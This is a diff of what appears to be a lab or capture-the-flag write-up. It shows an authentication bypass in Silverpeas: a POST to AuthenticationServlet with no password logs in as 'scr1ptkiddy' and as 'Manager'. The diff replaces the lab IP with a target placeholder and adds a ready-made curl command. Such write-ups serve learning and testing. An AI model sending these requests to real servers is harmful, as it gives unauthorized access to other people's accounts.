@@ -124,10 +124,18 @@ I sent the request to the Burp suite _repeater_ and modified the request to remo
 ```http
 POST /silverpeas/AuthenticationServlet 
 HTTP/1.1 
-Host: 10.10.14.253:8080 
+Host: <target-url>:8080 
 
 Login=scr1ptkiddy&DomainId=0
 ```
+
+**Or with cURL**:
+
+```bash
+$ curl "http://<target-url>:8080/silverpeas/AuthenticationServlet" -d "Login=scr1ptkiddy&DomainId=0" -H "content-type:application/x-www-form-urlencoded" -v
+```
+
+
 
 Notice that the `Login` field (presumably the username section) has the value **scr1ptkiddy**, which was found in step 2.
 
@@ -142,7 +150,7 @@ Set-Cookie: svpLogin=scr1ptkiddy; path=/; ...
 
 Notice that the server returned the following URL value in the `Location` header:
 
-`http://10.10.14.253:8080/silverpeas/look/jsp/MainFrame.jsp`
+`http://<target-url>:8080/silverpeas/look/jsp/MainFrame.jsp`
 
 
 
@@ -165,14 +173,14 @@ I visited the URL, and was navigated to a dashboard.
 ```http
 POST /silverpeas/AuthenticationServlet 
 HTTP/1.1 
-Host: 10.10.14.253:8080 
+Host: <target-url>:8080 
 
 Login=Manager&DomainId=0
 ```
 
 
 
-`http://10.10.14.253:8080/silverpeas/Main//look/jsp/MainFrame.jsp`
+`http://<target-url>:8080/silverpeas/Main//look/jsp/MainFrame.jsp`
 
 \
 After looking around the website, ...
